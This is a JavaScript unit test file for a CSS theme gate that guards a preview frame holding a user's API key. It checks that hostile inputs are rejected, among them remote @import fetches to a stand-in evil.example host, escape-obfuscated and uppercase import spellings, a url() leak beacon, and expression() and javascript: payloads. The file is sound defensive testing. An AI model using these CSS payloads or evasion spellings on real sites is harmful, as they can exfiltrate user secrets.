/**
 * Unit: lib/theme/gate.js — the deterministic gate for hand-edited theme CSS.
 *
 * This is the rung that stands between an author's typing and a SAME-ORIGIN,
 * un-sandboxed preview frame holding the user's BYOK OpenRouter key (HARD RULE
 * #24), so the tests are written the way a security boundary's tests have to be:
 * the reject cases are named ONE BY ONE rather than counted, because a gate that
 * quietly stops finding one of them still passes a test that only asserts "some
 * findings".
 *
 * THE CORPUS SWEEP IS THE OTHER HALF, and it is what makes the gate honest rather
 * than merely strict. `gateCss` — the component gate — rejects all 33 shipped
 * themes, so the cheap move (reuse it) would have produced a gate that was red on
 * every palette in the catalog before the author touched anything. Every shipped
 * theme passing, and the generated template passing on the FAIL-CLOSED default
 * registry, is the acceptance criterion.
 */

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const { gateThemeCss, BASE_THEME, ENGINE_THEME_IMPORT_RE, ENGINE_DEFAULTED_TOKENS } = require('../../../lib/theme/gate.js');
const { findCssImports } = require('../../../lib/core/css-scan.js');
const { THEME_NAME_IMPORT_RE } = require('../../../lib/engine/themes.js');
const { parseTheme, themeRecordView } = require('../../../lib/theme/parse.js');
const { deriveTheme, requiredTokenList } = require('../../../lib/theme/derive.js');
const { serializeTheme } = require('../../../lib/theme/serialize.js');
const { STARTERS, getStarter } = require('../../../lib/theme/starters.js');

const ROOT = path.join(__dirname, '..', '..', '..');
const THEMES_DIR = path.join(ROOT, 'themes');
const THEME_FILES = fs.readdirSync(THEMES_DIR).filter(f => f.endsWith('.css')).sort();
const readTheme = f => fs.readFileSync(path.join(THEMES_DIR, f), 'utf8');
/** The live registry a Studio host would pass: every shipped palette + the base. */
const REGISTRY = [...THEME_FILES.map(f => f.replace(/\.css$/, '')), BASE_THEME];

const errors = r => r.findings.filter(f => f.level === 'error');
const rules = r => errors(r).map(f => f.rule);

/** A minimal self-contained theme: every contract token at `:root`, plus a header. */
function fullTheme(extra = '') {
  const decls = requiredTokenList().map(n => `  --${n}: #808080;`).join('\n');
  return `/* @theme probe */\n@import 'lattice';\n\n:root {\n${decls}\n}\n${extra}`;
}

describe('theme gate — the shipped corpus', () => {
  test('all 33 shipped themes pass', () => {
    // 33, up from 32: carbone grew a curated light face and took the house two-file shape, so the corpus gained `carbone-dark`.
    assert.equal(THEME_FILES.length, 33, 'the corpus is 33 themes; update this test if that changes');
    const failed = [];
    for (const f of THEME_FILES) {
      const r = gateThemeCss(readTheme(f), { knownThemes: REGISTRY });
      if (!r.ok) failed.push([f, errors(r).map(e => `${e.rule}: ${e.message}`)]);
    }
    assert.deepEqual(failed, [], 'a shipped theme must never be indicted by the theme gate');
  });

  test('no shipped theme is BLOCKED out of the preview frame', () => {
    const blocked = THEME_FILES.filter(f => gateThemeCss(readTheme(f), { knownThemes: REGISTRY }).blocked);
    assert.deepEqual(blocked, []);
  });

  test('the 14 `*-dark` wrappers and the 5 a11y variants read as COMPOSING; the 14 palettes do not', () => {
    const composing = THEME_FILES.filter(f => gateThemeCss(readTheme(f), { knownThemes: REGISTRY }).composes);
    // 19, up from 18: carbone grew a curated light face and took the house two-file shape, so the corpus gained `carbone-dark`, which composes like every other wrapper.
    assert.equal(composing.length, 19, '14 *-dark wrappers + a11y-base + its 4 variants');
    assert.ok(composing.includes('ardesia-dark.css'));
    assert.ok(composing.includes('a11y-deuteranopia.css'));
    assert.ok(!composing.includes('ardesia.css'), "importing only 'lattice' is not composition — the base supplies no palette tokens");
  });

  test('a composing theme is never indicted for the tokens it INHERITS', () => {
    // themes/ardesia-dark.css is, in its entirety, `@import 'ardesia';` plus a
    // `color-scheme: dark` root block. It declares 0 of the 107 contract tokens and
    // is completely correct; a conformance rung that ran over it would report ~107
    // phantom errors against a shipped file.
    const r = gateThemeCss(readTheme('ardesia-dark.css'), { knownThemes: REGISTRY });
    assert.equal(themeRecordView(parseTheme(readTheme('ardesia-dark.css'))).tokens.length, 0);
    assert.deepEqual(rules(r), []);
    assert.deepEqual(r.findings.filter(f => f.rule === 'token-missing'), []);
  });

  test('exactly 3 shipped themes carry non-root rules, and they warn rather than fail', () => {
    const withTail = THEME_FILES.filter(f => gateThemeCss(readTheme(f), { knownThemes: REGISTRY }).findings.some(x => x.rule === 'non-root-rule'));
    assert.deepEqual(withTail, ['a11y-base.css', 'concrete.css', 'onyx.css']);
    for (const f of withTail) assert.equal(gateThemeCss(readTheme(f), { knownThemes: REGISTRY }).ok, true);
  });
});

describe('theme gate — the generated template', () => {
  test("serializeTheme's own output passes on the FAIL-CLOSED default registry", () => {
    // No `knownThemes` argument at all. The design note's blocking rung tripped on
    // the template itself (`findCssExfil` bans `@import` outright, and the template
    // opens with `@import 'lattice'`), which is the defect this allowlist exists to
    // fix — so the template passing with nothing passed in is the acceptance case.
    for (const s of STARTERS) {
      const css = serializeTheme(deriveTheme(s.essentials), { name: s.name, label: s.label });
      const r = gateThemeCss(css);
      assert.deepEqual(errors(r), [], `${s.name} template must gate clean`);
      assert.equal(r.blocked, false);
      assert.equal(r.composes, false);
    }
  });

  test('a description carrying a hostile import is neutralized by the header comment, not by luck', () => {
    // `serializeTheme` puts the free-text description in a `/* … */` header, and the
    // gate strips comments before scanning — so this is a joint property of the two.
    const s = getStarter('dusk');
    const css = serializeTheme(deriveTheme(s.essentials), {
      name: 'dusk', label: 'Dusk', description: "like @import url(https://evil.example/x.css); but warmer",
    });
    assert.deepEqual(errors(gateThemeCss(css)), []);
  });
});

describe('theme gate — the @import allowlist, reject case by reject case', () => {
  const gate = (imp, opts) => gateThemeCss(fullTheme().replace("@import 'lattice';", imp), opts);
  // Asserts on the theme-import rung specifically: a `url()` target also trips
  // `css-url-remote` (the component gate's own remote-fetch scan, which this gate
  // keeps), and a target that leaves the CSS unparseable — an unterminated string —
  // costs the conformance rung its root block. Both are correct; neither is what
  // these cases are pinning.
  const rejects = (imp, why, opts = { knownThemes: REGISTRY }) => {
    const r = gate(imp, opts);
    assert.equal(r.findings.filter(f => f.rule === 'theme-import').length, 1,
      `${why}: expected exactly one theme-import error for ${imp}, got ${JSON.stringify(rules(r))}`);
    assert.equal(r.ok, false, `${why}: ${imp} must not pass`);
    assert.equal(r.blocked, true, `${why}: a rejected import must pause the CSS out of the frame`);
  };

  test('@import url(…) — the remote fetch', () => {
    rejects('@import url(https://evil.example/x.css);', 'bare url()');
    rejects("@import url('//evil.example/x.css');", 'protocol-relative url()');
    rejects('@import url("data:text/css,a{}");', 'even a data: url() — a theme imports THEMES, nothing else');
  });

  test('a quoted target that is not a bare theme name', () => {
    rejects("@import 'https://evil.example/x.css';", 'quoted absolute URL');
    rejects("@import './sibling.css';", 'quoted relative path');
    rejects("@import 'themes/ardesia.css';", 'quoted path that contains a real theme name');
    rejects("@import '';", 'empty target');
  });

  test('an UNREGISTERED bare name — the hoisted relative fetch', () => {
    // ThemeStore.resolveThemeImports leaves an unknown name in place and
    // composeCss's hoistImports lifts it to the top of the sheet, where CSS
    // resolves it as a relative URL. This is the case a naive "drop the @import
    // rule for themes" relaxation would have admitted.
    rejects("@import 'not-a-registered-theme';", 'unknown name');
    rejects("@import 'ardesia';", 'known to the catalog but not to THIS registry', { knownThemes: ['lattice'] });
  });

  test('a qualifier tail — it stops the import resolving against the registry', () => {
    rejects("@import 'ardesia' screen;", 'media query');
    rejects("@import 'ardesia' layer(palette);", 'layer()');
    rejects("@import 'ardesia' supports(display: grid);", 'supports()');
  });

  test('an unquoted or unterminated target', () => {
    rejects('@import ardesia;', 'unquoted');
    rejects("@import 'ardesia;", 'unterminated string — fail closed, never certify what nobody can read');
  });

  test('an escape-obfuscated import cannot dodge the scan', () => {
    rejects('@imp\\ort url(https://evil.example/x.css);', 'CSS escape in the at-keyword');
  });

  /**
   * THE DECODE-STEP DRIFT. The gate DETECTS with browser semantics (escapes decoded,
   * at-keyword case-insensitive) and must JUDGE with the engine resolver's (raw bytes,
   * case-sensitive). The first cut conflated them: it tested a re-derived name grammar
   * against the DECODED target, so both of these read as the registered theme `ardesia`
   * and passed with `ok:true, blocked:false` — while the engine left the import in
   * place for `hoistImports` to lift into position 0 of the composed sheet.
   */
  test('an ESCAPED spelling of a registered name is rejected, not decoded into a pass', () => {
    rejects("@import '\\61 rdesia';", 'hex escape spelling `ardesia`');
    rejects("@import '\\000061rdesia';", '6-digit hex escape');
    rejects("@import 'arde\\sia';", 'identity escape mid-name');
  });

  test('an UPPERCASE at-keyword is rejected — the resolver is case-sensitive, browsers are not', () => {
    rejects("@IMPORT 'ardesia';", 'uppercase @IMPORT');
    rejects("@Import 'ardesia';", 'mixed case');
  });

  test('a SELF-import is rejected — the engine breaks the cycle by leaving it in the sheet', () => {
    // `resolveThemeImports` leaves a cycle-broken import in place and `hoistImports`
    // lifts it, so a perfectly registered name reaches position 0 as a live fetch.
    // The sheet's own identity comes from its `@theme` directive, as ThemeStore reads it.
    const css = fullTheme().replace("@import 'lattice';", "@import 'probe';\n@import 'lattice';");
    const r = gateThemeCss(css, { knownThemes: [...REGISTRY, 'probe'] });
    const imp = r.findings.filter((f) => f.rule === 'theme-import');
    assert.equal(imp.length, 1);
    assert.match(imp[0].message, /cannot import itself/);
    assert.equal(r.blocked, true);
  });

  test('`knownThemes` accepts a PREDICATE, so a host can answer more than set membership', () => {
    const css = fullTheme().replace("@import 'lattice';", "@import 'ardesia';");
    assert.equal(gateThemeCss(css, { knownThemes: () => true }).blocked, false);
    assert.equal(gateThemeCss(css, { knownThemes: () => false }).blocked, true);
  });

  test('ALLOWED: a bare quoted import of a registered theme name', () => {
    for (const imp of ["@import 'lattice';", '@import "ardesia";', "@import 'a11y-base';", '@import"ardesia";']) {
      const r = gate(imp, { knownThemes: REGISTRY });
      assert.deepEqual(rules(r), [], `${imp} must be allowed`);
      assert.equal(r.blocked, false);
    }
  });

  test('an @import inside a COMMENT is not an import', () => {
    const r = gateThemeCss(fullTheme('/* see @import url(https://example.com/x.css) for why not */'), { knownThemes: REGISTRY });
    assert.deepEqual(rules(r), []);
  });

  test('an @import spelled inside a STRING VALUE is rejected anyway — fail closed', () => {
    // Known and deliberate: the scanner strips comments, not string literals (the
    // same limitation `lib/layout/gate.js` records for its own scanners — blanking
    // strings would blind the url() target reads). A decorative
    // `content: "@import url(x)"` is therefore reported. No shipped theme hits it,
    // and the failure direction is the safe one.
    const r = gateThemeCss(fullTheme('.probe::after { content: "@import url(x)"; }'), { knownThemes: REGISTRY });
    assert.ok(rules(r).includes('theme-import'));
  });
});

describe('theme gate — the safety rung the component gate contributes', () => {
  const gate = extra => gateThemeCss(fullTheme(extra), { knownThemes: REGISTRY });

  test('a remote url() beacon is blocked', () => {
    const r = gate(':root { --x: url(https://evil.example/?leak); }');
    assert.deepEqual(rules(r), ['css-url-remote']);
    assert.equal(r.blocked, true);
  });

  test('expression(), -moz-binding and javascript: are blocked', () => {
    assert.deepEqual(rules(gate('.p { width: expression(alert(1)); }')), ['css-expression']);
    assert.deepEqual(rules(gate('.p { -moz-binding: url(#x); }')), ['css-binding']);
    assert.deepEqual(rules(gate('.p { background: javascript:alert(1); }')), ['css-scheme']);
  });

  test('an on-device url() — a #fragment ref or an inline data: URI — is allowed', () => {
    assert.deepEqual(rules(gate('.p { filter: url(#blur); background-image: url(data:image/svg+xml,%3Csvg/%3E); }')), []);
  });

  test('an empty stylesheet is an error, not a pass', () => {
    assert.equal(gateThemeCss('   ').ok, false);
    assert.deepEqual(gateThemeCss('').findings.map(f => f.rule), ['empty-css']);
  });
});

describe('theme gate — conformance against the contract', () => {
  test('a self-contained theme missing a no-safe-default token is an ERROR that names it', () => {
    const css = fullTheme().replace(/^ {2}--spectrum: [^\n]*\n/m, '');
    const r = gateThemeCss(css, { knownThemes: REGISTRY });
    const missing = r.findings.filter(f => f.rule === 'token-missing');
    assert.equal(missing.length, 1);
    assert.match(missing[0].message, /--spectrum/);
    assert.equal(r.ok, false);
  });

  test('a conformance error does NOT block the preview — only the safety rung does', () => {
    // A theme missing a token is wrong and still renders; pausing it out of the
    // frame would hide the very thing the author is trying to fix.
    const r = gateThemeCss(fullTheme().replace(/^ {2}--spectrum: [^\n]*\n/m, ''), { knownThemes: REGISTRY });
    assert.equal(r.ok, false);
    assert.equal(r.blocked, false);
  });

  test('a token declared under `:root:root` or `:where(:root)` still counts as declared', () => {
    const css = fullTheme().replace(/^ {2}--spectrum: ([^\n]*)\n/m, '') + '\n:root:root { --spectrum: linear-gradient(90deg, #000, #fff); }\n';
    assert.deepEqual(gateThemeCss(css, { knownThemes: REGISTRY }).findings.filter(f => f.rule === 'token-missing'), []);
  });

  test('`color-scheme` under a root selector is not mistaken for a token', () => {
    const r = gateThemeCss(fullTheme() + '\n:root { color-scheme: dark; }\n', { knownThemes: REGISTRY });
    assert.deepEqual(rules(r), []);
    assert.deepEqual(r.findings.filter(f => f.rule === 'non-root-rule'), []);
  });
});

describe('theme gate — the pinned constants', () => {
  test('ENGINE_DEFAULTED_TOKENS is exactly the contract set no self-contained palette declares', () => {
    // Re-derived from the corpus rather than asserted, so the allowlist fails on a
    // STALE entry (a token a palette started declaring) as well as on a missing one.
    const required = requiredTokenList();
    const undeclared = new Set(required);
    let selfContained = 0;
    for (const f of THEME_FILES) {
      const view = themeRecordView(parseTheme(readTheme(f)));
      const composes = view.atRules.some(a => a.name === 'import' && !/^(['"])lattice\1$/.test(a.prelude.replace(/;$/, '').trim()));
      if (composes) continue;
      selfContained++;
      for (const t of view.tokens) undeclared.delete(t.name);
    }
    assert.equal(selfContained, 14, 'the 14 palettes whose only import is the base');
    assert.deepEqual([...undeclared].sort(), Object.keys(ENGINE_DEFAULTED_TOKENS).sort());
  });

  test('every ENGINE_DEFAULTED_TOKENS name really is defaulted at :root in the engine', () => {
    const base = fs.readFileSync(path.join(ROOT, 'lib', 'base', 'base.tokens.css'), 'utf8');
    for (const name of Object.keys(ENGINE_DEFAULTED_TOKENS)) {
      assert.match(base, new RegExp(`--${name}:\\s*var\\(`), `--${name} must have an engine default, or it is not a warning`);
    }
  });

  test('BASE_THEME agrees with the engine resolver it mirrors', () => {
    const src = fs.readFileSync(path.join(ROOT, 'lib', 'engine', 'themes.js'), 'utf8');
    assert.match(src, new RegExp(`const BASE_THEME = '${BASE_THEME}'`));
  });

  /**
   * THE INVARIANT, EXECUTED RATHER THAN COMPARED.
   *
   * The first version of this pin read `THEME_NAME_IMPORT_RE`'s character class out of
   * the engine source and compared it to a re-derived name regex — which is a claim
   * about two strings, not about behavior. It passed while the gate was admitting
   * `@import '\61 rdesia'`, because the drift was in the DECODE STEP, which a
   * character-class comparison cannot model.
   *
   * What has to be true is a SUBSET relation over statements: everything this gate
   * allows, the engine's resolver consumes, capturing the same name. So run the
   * engine's own regex — lifted from its source, not retyped — over every allowed
   * statement, and over a corpus that includes the spellings that broke it.
   */
  test('every statement the gate ALLOWS is one the engine resolver consumes, same name', () => {
    // THE ENGINE'S OWN REGEX OBJECT, imported rather than re-typed or scraped. It is
    // `/g`, so `lastIndex` is reset before each `exec` — a shared stateful regex that
    // silently skips a match would make this pin pass for the wrong reason.
    const engineRe = THEME_NAME_IMPORT_RE;

    const statements = [
      "@import 'lattice';", '@import "ardesia";', '@import"ardesia";', "@import\t'ardesia' ;",
      "@import '\\61 rdesia';", "@IMPORT 'ardesia';", '@import url(https://e/x.css);',
      "@import 'ardesia' screen;", '@import ardesia;', "@import './a.css';", "@import 'probe';",
    ];
    let allowed = 0;
    for (const stmt of statements) {
      const css = fullTheme().replace("@import 'lattice';", stmt);
      const r = gateThemeCss(css, { knownThemes: [...REGISTRY, 'probe'] });
      const imp = findCssImports(css)[0];
      if (r.findings.some((f) => f.rule === 'theme-import')) continue;
      allowed++;
      engineRe.lastIndex = 0;
      const m = engineRe.exec(imp.raw + ';');
      assert.ok(m, `the engine resolver must consume an allowed statement: ${stmt}`);
      assert.equal(m[0].length, imp.raw.length + 1, `${stmt}: the resolver must consume the WHOLE statement, not a prefix`);
      assert.ok(ENGINE_THEME_IMPORT_RE.test(imp.raw), stmt);
      assert.equal(ENGINE_THEME_IMPORT_RE.exec(imp.raw)[2], m[2], `${stmt}: gate and resolver must read the same name`);
    }
    assert.equal(allowed, 4, 'the four well-formed spellings, and only those');
  });
});
